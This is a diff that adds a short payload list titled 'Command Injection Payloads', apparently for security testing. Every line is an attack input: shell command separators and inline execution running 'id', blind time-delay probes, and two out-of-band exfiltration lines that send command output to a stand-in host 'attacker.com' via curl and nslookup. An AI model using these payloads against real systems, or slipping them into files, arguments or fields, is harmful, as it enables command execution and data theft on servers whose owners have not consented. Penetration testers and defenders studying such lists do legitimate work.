@@ -1,0 +1,21 @@
+# Command Injection Payloads
+
+# Command Separators
+; id
+| id
+& id
+\n id
+&& id
+|| id
+
+# Inline Execution
+`id`
+$(id)
+
+# Out-of-band / DNS exfiltration
+; curl http://attacker.com/$(id | base64)
+; nslookup $(whoami).attacker.com
+
+# Blind time delays
+; sleep 5
+; ping -c 5 127.0.0.1
